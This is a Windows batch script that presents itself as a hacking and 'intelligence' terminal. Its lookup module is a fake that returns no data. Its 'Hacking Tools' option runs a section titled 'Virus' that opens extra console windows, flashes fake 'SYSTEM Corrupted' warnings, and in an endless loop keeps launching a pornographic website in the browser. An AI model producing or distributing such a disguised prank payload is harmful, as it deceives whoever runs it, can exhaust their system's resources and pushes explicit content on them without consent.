@echo off
setlocal EnableDelayedExpansion
title  DekoBean - Intelligence Terminal
color 0B
mode con: cols=100 lines=64

:MENU
cls
echo.
echo  ===============================================================
echo                           Deko Sniffer
echo  ==========================================================HI===
echo.                  
echo.       
echo   [1] Deko INTELLIGENCE
echo.      
echo.  [2] Hacking Tools            
echo  ===============================================================
set /p choice="  SELECT MODULE: "

if "%choice%"=="1" goto IP
if "%choice%"=="2" goto Deko

if "%choice%"=="5" exit
goto MENU





:IP
cls
echo.
echo  =============== IP INTELLIGENCE =====================
echo.
set /p ip=" ENTER Phone Number: "
echo.
echo  [*] Generating  network report...
timeout /t 2 >nul
echo. 
echo  COUNTRY    :  use Other tool
echo  CITY       : use Other tool
echo  ISP        : use Other tool
echo  DEVICE     : use Other tool
echo  STATUS     : use Other tool
echo  Name       : use Other tool
echo  Age        : use Other tool
echo =============== IP INTELLIGENCE =====================
echo.
pause
goto MENU



:DEKO
@echo off
title Virus

:: OPEN 5 EXTRA WINDOWS
for /L %%i in (1,1,5) do (
    start "" cmd /c ""%~f0" GLITCH"
)

if /i "%1"=="GLITCH" goto FLASH

:FLASH
mode con: cols=120 lines=40

:LOOP
for %%C in (01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 20 30 40 50 60 70 80 90 A0 B0 C0 D0 E0 F0) do (
    color %%C
    cls
    echo.
    echo.
    echo           !!! SYSTEM Corrupted!!!
    echo.
    echo           SIGNAL CORRUPTED
)

start "" "https://de.pornhub.org/view_video.php?viewkey=6afc94864e3af"

goto LOOP